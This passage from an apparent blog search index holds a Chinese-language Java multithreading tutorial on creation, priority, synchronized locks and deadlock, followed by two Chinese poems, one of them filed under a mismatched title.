i&lt;<span class="hljs-number">10</span>; i++)&#123;            System.out.println(<span class="hljs-string">&quot;子线程逻辑&quot;</span>+i);        &#125;    &#125;&#125;</code></pre></div><p>执行后会发现先执行的<code>主线程逻辑这句话</code>，然后才是子线程逻辑。</p></li><li><p>通过Runnable接口</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.p1.theard;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadCreate2</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        <span class="hljs-type">Runnable</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Runnable</span>() &#123;            <span class="hljs-meta">@Override</span>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">9</span>; i++) &#123;                    System.out.println(<span class="hljs-string">&quot;子线程逻辑1:&quot;</span>+i);                &#125;            &#125;        &#125;;        <span class="hljs-comment">//lambda表达式</span>        <span class="hljs-type">Runnable</span> <span class="hljs-variable">r1</span> <span class="hljs-operator">=</span> () -&gt; &#123;            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">9</span>; i++) &#123;                System.out.println(<span class="hljs-string">&quot;子线程逻辑2:&quot;</span>+i);            &#125;        &#125;;        <span class="hljs-comment">//通过有参来实例化线程</span>        <span class="hljs-type">Thread</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r);        <span class="hljs-type">Thread</span> <span class="hljs-variable">t2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r1);        <span class="hljs-comment">//启动</span>        t1.start();        System.out.println(<span class="hljs-string">&quot;主线程逻辑1&quot;</span>);        t2.start();        System.out.println(<span class="hljs-string">&quot;主线程逻辑2&quot;</span>);    &#125;&#125;</code></pre></div><p>通过多次运行能发现他们每次运行的每个线程运行时间都是不一样的，更好的感受下争抢cpu时间片这个概念。</p></li></ol><h1 id="线程的命名"><a href="#线程的命名" class="headerlink" title="线程的命名"></a>线程的命名</h1><ol><li><p>实例化对象同时通过构造方法命名</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.p1.theard;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Thread_name</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        <span class="hljs-type">Thread</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(<span class="hljs-string">&quot;custom1&quot;</span>);        System.out.println(t1.getName());    &#125;&#125;</code></pre></div></li><li><p>Runnable接口创建同时命名</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.p1.theard;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Thread_name</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        <span class="hljs-type">Thread</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; &#123;&#125;,<span class="hljs-string">&quot;custom2&quot;</span>);        System.out.println(t1.getName());    &#125;&#125;</code></pre></div></li><li><p>自定义线程类,实例化同时进行名称赋值</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.p1.theard;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Thread_name</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        <span class="hljs-type">MyThread2</span> <span class="hljs-variable">myThread2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyThread2</span>(<span class="hljs-string">&quot;custom3&quot;</span>);        System.out.println(myThread2.getName());    &#125;&#125;<span class="hljs-keyword">class</span> <span class="hljs-title class_">MyThread2</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Thread</span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyThread2</span><span class="hljs-params">(String name)</span>&#123;        <span class="hljs-built_in">this</span>.setName(name);    &#125;&#125;</code></pre></div></li></ol><h1 id="线程的休眠"><a href="#线程的休眠" class="headerlink" title="线程的休眠"></a>线程的休眠</h1><div class="code-wrapper"><pre><code class="hljs java">Thread.sleep()</code></pre></div><p>以毫秒为单位</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.p1.theard;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Thread_sleep</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        <span class="hljs-type">MyThread3</span> <span class="hljs-variable">myThread3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyThread3</span>();        myThread3.start();    &#125;&#125;<span class="hljs-keyword">class</span> <span class="hljs-title class_">MyThread3</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Thread</span>&#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;            System.out.println(i);            <span class="hljs-keyword">try</span> &#123;                Thread.sleep(<span class="hljs-number">1000</span>);            &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;                e.printStackTrace();            &#125;        &#125;    &#125;&#125;</code></pre></div><h1 id="线程的优先级"><a href="#线程的优先级" class="headerlink" title="线程的优先级"></a>线程的优先级</h1><p>设置线程的优先级只是去修改这个线程抢到cpu时间片的概率。<br>不代表优先级高的一定能抢到cpu时间片。<br>优先级的设置是一个(0,10]的整数，默认是5。<br>设置优先级必须要放到start之前。 </p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.p1.theard;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Thread_first</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        <span class="hljs-type">Runnable</span> <span class="hljs-variable">r1</span> <span class="hljs-operator">=</span> () -&gt; &#123;            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) &#123;                System.out.println(Thread.currentThread().getName()+<span class="hljs-string">&quot;&quot;</span>+i);            &#125;        &#125;;        <span class="hljs-type">Thread</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r1,<span class="hljs-string">&quot;Thread-1:&quot;</span>);        <span class="hljs-type">Thread</span> <span class="hljs-variable">t2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r1,<span class="hljs-string">&quot;Thread-2:&quot;</span>);        t1.setPriority(<span class="hljs-number">1</span>);        t2.setPriority(<span class="hljs-number">10</span>);        t1.start();        t2.start();    &#125;&#125;</code></pre></div><h1 id="线程的礼让"><a href="#线程的礼让" class="headerlink" title="线程的礼让"></a>线程的礼让</h1><p>让当前运行状态的线程释放自己的cpu资源，由运行状态回到就绪状态，然后重新抢cpu时间片。 </p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.p1.theard;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Thread_yield</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        <span class="hljs-type">Runnable</span> <span class="hljs-variable">r1</span> <span class="hljs-operator">=</span> () -&gt;&#123;            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;                System.out.println(Thread.currentThread().getName()+<span class="hljs-string">&quot;&quot;</span>+i);                <span class="hljs-keyword">if</span> (i == <span class="hljs-number">3</span>)&#123;                    Thread.yield();                &#125;            &#125;        &#125;;        <span class="hljs-type">Thread</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r1,<span class="hljs-string">&quot;thread-1:&quot;</span>);        <span class="hljs-type">Thread</span> <span class="hljs-variable">t2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r1,<span class="hljs-string">&quot;thread-2:&quot;</span>);        t1.start();        t2.start();    &#125;&#125;</code></pre></div><h1 id="线程的临界资源问题"><a href="#线程的临界资源问题" class="headerlink" title="线程的临界资源问题"></a>线程的临界资源问题</h1><p>线程中资源共享<br>例如一个景点的四个售票员，他们卖的票都是从一个票库里拿出来的，这个票库里的票就叫临界资源。 </p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.p1.theard;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ScorceFilct</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        <span class="hljs-comment">//实例化四个线程来模拟四个售票员</span>        <span class="hljs-type">Runnable</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> () -&gt; &#123;            <span class="hljs-keyword">while</span> (TicketClent.restCount &gt; <span class="hljs-number">0</span>)&#123;                System.out.println(Thread.currentThread().getName()+<span class="hljs-string">&quot;卖出1张票，剩余&quot;</span>+ --TicketClent.restCount);            &#125;        &#125;;        <span class="hljs-type">Thread</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r,<span class="hljs-string">&quot;thread-1&quot;</span>);        <span class="hljs-type">Thread</span> <span class="hljs-variable">t2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r,<span class="hljs-string">&quot;thread-2&quot;</span>);        <span class="hljs-type">Thread</span> <span class="hljs-variable">t3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r,<span class="hljs-string">&quot;thread-3&quot;</span>);        <span class="hljs-type">Thread</span> <span class="hljs-variable">t4</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r,<span class="hljs-string">&quot;thread-4&quot;</span>);        t1.start();        t2.start();        t3.start();        t4.start();    &#125;&#125;<span class="hljs-comment">//票库</span><span class="hljs-keyword">class</span> <span class="hljs-title class_">TicketClent</span>&#123;    <span class="hljs-comment">//票库中的100张票</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">restCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>;&#125;</code></pre></div><p>按照正常逻辑，最后一条输出应该是<code>Jon卖出1张票，剩余0</code>，但事实并不是这样。</p><div class="code-wrapper"><pre><code class="hljs java">System.out.println(Thread.currentThread().getName()+<span class="hljs-string">&quot;卖出1张票，剩余&quot;</span>+ --TicketClent.restCount);</code></pre></div><p>这行代码的运行是先去将TicketClent类中的restCount变量减1</p><p>先是由thread-1抢到了cpu时间片，thread-1刚去将restCount减一，还没来得及打印或者刚刚打印，就被thread-2抢走了cpu时间片（剩余99张） </p><p>thread-2刚执行完减一操作，没有来得及打印又被thread-4抢去了cpu时间片（剩余98张）（第97张在比较靠下） </p><p>thread-4也是减一完之后没有来得及打印，被thread-3抢去cpu时间片（剩余97张） </p><p>thread-3减一之后没有打印就被thread-1抢去cpu时间片（剩余96） </p><p>thread-1得到cpu时间片之后完成了减一打印一系列操作，进行了两次循环之后被thread-2抢去了cpu时间片 </p><p>thread-2得到cpu时间片之后先把没有来得及打印的东西打印出来，然后正常执行减一打印操作，一路高歌猛进。 </p><p>以此类推就能明白整个逻辑<br>（ps：thread-3，thread-4真水，前边就个抢到一次） </p><h1 id="解决临界资源问题（线程锁）"><a href="#解决临界资源问题（线程锁）" class="headerlink" title="解决临界资源问题（线程锁）"></a>解决临界资源问题（线程锁）</h1><p>临界资源问题的本质是多个线程同时访问同一个资源<br>解决方法：在某个线程访问临界资源时，在资源外边加一把锁，其他资源发现锁之后就等待，等到解锁之后再去操作资源。</p><p>线程锁： </p><div class="code-wrapper"><pre><code class="hljs java">多个同时访问临界资源的线程看到的锁需要时同一把锁</code></pre></div><h2 id="同步代码段（synchroized）"><a href="#同步代码段（synchroized）" class="headerlink" title="同步代码段（synchroized）"></a>同步代码段（synchroized）</h2><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.p1.theard;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ScorceFilct</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        <span class="hljs-comment">//实例化四个线程来模拟四个售票员</span>        <span class="hljs-type">Runnable</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> () -&gt; &#123;            <span class="hljs-keyword">while</span> (TicketClent.restCount &gt; <span class="hljs-number">0</span>)&#123;                <span class="hljs-comment">//对象锁，在括号中写对象</span>                <span class="hljs-comment">//类锁： 在括号中写类</span>                <span class="hljs-keyword">synchronized</span> (<span class="hljs-string">&quot;&quot;</span>)&#123;                    System.out.println(Thread.currentThread().getName() + <span class="hljs-string">&quot;卖出1张票，剩余&quot;</span> + --TicketClent.restCount);                &#125;            &#125;        &#125;;        <span class="hljs-type">Thread</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r,<span class="hljs-string">&quot;thread-1&quot;</span>);        <span class="hljs-type">Thread</span> <span class="hljs-variable">t2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r,<span class="hljs-string">&quot;thread-2&quot;</span>);        <span class="hljs-type">Thread</span> <span class="hljs-variable">t3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r,<span class="hljs-string">&quot;thread-3&quot;</span>);        <span class="hljs-type">Thread</span> <span class="hljs-variable">t4</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r,<span class="hljs-string">&quot;thread-4&quot;</span>);        t1.start();        t2.start();        t3.start();        t4.start();    &#125;&#125;<span class="hljs-comment">//票库</span><span class="hljs-keyword">class</span> <span class="hljs-title class_">TicketClent</span>&#123;    <span class="hljs-comment">//票库中的100张票</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">restCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>;&#125;</code></pre></div><p>运行之后我们会发现出现负数<br>原因是当restCount为1时，其他while循环成立，线程进去之后发现锁，就会在while里边锁外边等待正在执行的线程结束释放资源解锁，解锁之后刚运行完的线程发现不满足循环条件就不会再去争抢，而在循环里边的线程不回去管restCount的值继续去执行。 </p><p>解决方法：在锁中加一个判断，判断restCount是否大于0再去执行打印即可 </p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.p1.theard;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ScorceFilct</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        <span class="hljs-comment">//实例化四个线程来模拟四个售票员</span>        <span class="hljs-type">Runnable</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> () -&gt; &#123;            <span class="hljs-keyword">while</span> (TicketClent.restCount &gt; <span class="hljs-number">0</span>)&#123;                <span class="hljs-keyword">synchronized</span> (<span class="hljs-string">&quot;&quot;</span>)&#123;                    <span class="hljs-keyword">if</span> (TicketClent.restCount&gt;<span class="hljs-number">0</span>) &#123;                        System.out.println(Thread.currentThread().getName() + <span class="hljs-string">&quot;卖出1张票，剩余&quot;</span> + --TicketClent.restCount);                    &#125;                &#125;            &#125;        &#125;;        <span class="hljs-type">Thread</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r,<span class="hljs-string">&quot;thread-1&quot;</span>);        <span class="hljs-type">Thread</span> <span class="hljs-variable">t2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r,<span class="hljs-string">&quot;thread-2&quot;</span>);        <span class="hljs-type">Thread</span> <span class="hljs-variable">t3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r,<span class="hljs-string">&quot;thread-3&quot;</span>);        <span class="hljs-type">Thread</span> <span class="hljs-variable">t4</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r,<span class="hljs-string">&quot;thread-4&quot;</span>);        t1.start();        t2.start();        t3.start();        t4.start();    &#125;&#125;<span class="hljs-comment">//票库</span><span class="hljs-keyword">class</span> <span class="hljs-title class_">TicketClent</span>&#123;    <span class="hljs-comment">//票库中的100张票</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">restCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>;&#125;</code></pre></div><h2 id="同步方法-（使用关键字synchronized修饰的方法）"><a href="#同步方法-（使用关键字synchronized修饰的方法）" class="headerlink" title="同步方法 （使用关键字synchronized修饰的方法）"></a>同步方法 （使用关键字synchronized修饰的方法）</h2><p>静态方法：同步锁就是类锁 当前类.class<br>非静态方法：this</p><p>将买票（执行逻辑）放到一个单独的方法里边，并且用synchronized修饰</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.p1.theard;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ScorceFilct</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        <span class="hljs-comment">//实例化四个线程来模拟四个售票员</span>        <span class="hljs-type">Runnable</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> () -&gt; &#123;            <span class="hljs-keyword">while</span> (TicketClent.restCount &gt; <span class="hljs-number">0</span>)&#123;                soidCket();            &#125;        &#125;;        <span class="hljs-type">Thread</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r,<span class="hljs-string">&quot;thread-1&quot;</span>);        <span class="hljs-type">Thread</span> <span class="hljs-variable">t2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r,<span class="hljs-string">&quot;thread-2&quot;</span>);        <span class="hljs-type">Thread</span> <span class="hljs-variable">t3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r,<span class="hljs-string">&quot;thread-3&quot;</span>);        <span class="hljs-type">Thread</span> <span class="hljs-variable">t4</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r,<span class="hljs-string">&quot;thread-4&quot;</span>);        t1.start();        t2.start();        t3.start();        t4.start();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">soidCket</span><span class="hljs-params">()</span>&#123;        <span class="hljs-keyword">if</span> (TicketClent.restCount&gt;<span class="hljs-number">0</span>) &#123;            System.out.println(Thread.currentThread().getName() + <span class="hljs-string">&quot;卖出1张票，剩余&quot;</span> + --TicketClent.restCount);        &#125;    &#125;&#125;<span class="hljs-comment">//票库</span><span class="hljs-keyword">class</span> <span class="hljs-title class_">TicketClent</span>&#123;    <span class="hljs-comment">//票库中的100张票</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">restCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>;&#125;</code></pre></div><h2 id="显式（ReentrcntLock）"><a href="#显式（ReentrcntLock）" class="headerlink" title="显式（ReentrcntLock）"></a>显式（ReentrcntLock）</h2><p>创建ReentecntLock对象 在代码段前后用<br>lock（）方法（代码段前）<br>unlock（）方法（代码段后）</p><h1 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h1><p>多个线程彼此持有对方需要的锁，而不去释放自己的锁 </p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.p1.theard;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeadLock</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        <span class="hljs-type">Runnable</span> <span class="hljs-variable">r1</span> <span class="hljs-operator">=</span> () -&gt;&#123;          <span class="hljs-keyword">synchronized</span> (<span class="hljs-string">&quot;A&quot;</span>)&#123;              System.out.println(<span class="hljs-string">&quot;r1线程持有a锁，等待b锁&quot;</span>);              <span class="hljs-keyword">synchronized</span> (<span class="hljs-string">&quot;B&quot;</span>)&#123;                  System.out.println(<span class="hljs-string">&quot;r1线程同时持有a，b锁&quot;</span>);              &#125;          &#125;        &#125;;        <span class="hljs-type">Runnable</span> <span class="hljs-variable">r2</span> <span class="hljs-operator">=</span> () -&gt;&#123;            <span class="hljs-keyword">synchronized</span> (<span class="hljs-string">&quot;B&quot;</span>)&#123;                System.out.println(<span class="hljs-string">&quot;r2线程持有b锁，等待a锁&quot;</span>);                <span class="hljs-keyword">synchronized</span> (<span class="hljs-string">&quot;A&quot;</span>)&#123;                    System.out.println(<span class="hljs-string">&quot;r2线程同时持有a，b锁&quot;</span>);                &#125;            &#125;        &#125;;        <span class="hljs-type">Thread</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r1);        <span class="hljs-type">Thread</span> <span class="hljs-variable">t2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r2);        t1.start();        t2.start();    &#125;&#125;</code></pre></div><p>没有任何一个线程能去同时持有a锁和b锁<br>并且程序没有结束，线程都在等待对方解锁<br>我们在程序中尽量要去避免死锁</p><h1 id="解死锁"><a href="#解死锁" class="headerlink" title="解死锁"></a>解死锁</h1><p>wait：等待，Object类中的一个方法，让当前的线程，并且让出cpu资源，并且让线程进入等待队列。 </p><p>notify： 通知，Object类中的一个方法，唤醒等待队列中的一个线程，使这个线程进入锁池。</p><p>notifyAll：通知，Object类中的一个方法，唤醒等待队列的所有线程，使所以线程进入锁池。</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.p1.theard;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeadLock</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        <span class="hljs-type">Runnable</span> <span class="hljs-variable">r1</span> <span class="hljs-operator">=</span> () -&gt;&#123;          <span class="hljs-keyword">synchronized</span> (<span class="hljs-string">&quot;A&quot;</span>)&#123;              System.out.println(<span class="hljs-string">&quot;r1线程持有a锁，等待b锁&quot;</span>);              <span class="hljs-keyword">try</span> &#123;                  <span class="hljs-comment">//r1释放掉A线程，并且r1进入等待队列，等待唤醒</span>                  <span class="hljs-string">&quot;A&quot;</span>.wait();              &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;                  e.printStackTrace();              &#125;              <span class="hljs-keyword">synchronized</span> (<span class="hljs-string">&quot;B&quot;</span>)&#123;                  System.out.println(<span class="hljs-string">&quot;r1线程同时持有a，b锁&quot;</span>);              &#125;          &#125;        &#125;;        <span class="hljs-type">Runnable</span> <span class="hljs-variable">r2</span> <span class="hljs-operator">=</span> () -&gt;&#123;            <span class="hljs-keyword">synchronized</span> (<span class="hljs-string">&quot;B&quot;</span>)&#123;                System.out.println(<span class="hljs-string">&quot;r2线程持有b锁，等待a锁&quot;</span>);                <span class="hljs-keyword">synchronized</span> (<span class="hljs-string">&quot;A&quot;</span>)&#123;                    System.out.println(<span class="hljs-string">&quot;r2线程同时持有a，b锁</span><span class="hljs-string">                    &quot;</span>);                &#125;            &#125;        &#125;;        <span class="hljs-type">Thread</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r1);        <span class="hljs-type">Thread</span> <span class="hljs-variable">t2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r2);        t1.start();        t2.start();    &#125;&#125;</code></pre></div><p>使用wait之后发现r2抢到了a锁和b锁，释放了b锁<br>但r1没有继续进行，而此时程序也没有正常退出。<br>是因为r1线程进入了等待队列，还没有被唤醒。<br>在r2完成之后去唤醒r1就能使r1进入b锁</p>]]></content>
    
    
    <categories>
      
      <category>一些杂七杂八的技术</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>致橡树</title>
    <link href="/article/26be181c.html"/>
    <url>/article/26be181c.html</url>
    
    <content type="html"><![CDATA[<h1 id="《扬州慢·淮左名都》-姜夔"><a href="#《扬州慢·淮左名都》-姜夔" class="headerlink" title="《扬州慢·淮左名都》- 姜夔"></a>《扬州慢·淮左名都》- 姜夔</h1><p>淳熙丙申至日，予过维扬。夜雪初霁，荠麦弥望。入其城，则四顾萧条，寒水自碧，暮色渐起，戍角悲吟。予怀怆然，感慨今昔，因自度此曲。千岩老人以为有《黍离》之悲也。</p><p>淮左名都，竹西佳处，解鞍少驻初程。过春风十里，尽荠麦青青。自胡马窥江去后，废池乔木，犹厌言兵。渐黄昏，清角吹寒，都在空城。</p><p>杜郎俊赏，算而今重到须惊。纵豆蔻词工，青楼梦好，难赋深情。二十四桥仍在，波心荡，冷月无声。念桥边红药，年年知为谁生？</p>]]></content>
    
    
    <categories>
      
      <category>诗</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>致橡树</title>
    <link href="/article/26be181c.html"/>
    <url>/article/26be181c.html</url>
    
    <content type="html"><![CDATA[<h1 id="致橡树"><a href="#致橡树" class="headerlink" title="致橡树"></a>致橡树</h1><p>​                    舒婷</p><p>我如果爱你——<br>绝不像攀援的凌霄花，<br>借你的高枝炫耀自己；<br>我如果爱你——<br>绝不学痴情的鸟儿，<br>为绿荫重复单调的歌曲；<br>也不止像泉源，<br>常年送来清凉的慰藉；<br>也不止像险峰，<br>增加你的高度，衬托你的威仪。<br>甚至日光，<br>甚至春雨。</p><p>不，这些都还不够！<br>我必须是你近旁的一株木棉，<br>作为树的形象和你站在一起。<br>根，紧握在地下；<br>叶，相触在云里。<br>每一阵风过，<br>我们都互相致意，<br>但没有人，<br>听懂我们的言语。<br>你有你的铜枝铁干，<br>像刀，像剑，也像戟；<br>我有我红硕的花朵，<br>像沉重的叹息，<br>又像英勇的火炬。</p><p>我们分担寒潮、风雷、霹雳；<br>我们共享雾霭、流岚、虹霓。<br>仿佛永远分离，<br>却又终身相依。<br>这才是伟大的爱情，<br>坚贞就在这里：<br>爱——<br>不仅爱你伟岸的身躯，<br>也爱你坚持的位置，<br>足下的土地。</p>]]></content>
    
    
    <categories>
      
      <category>诗</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
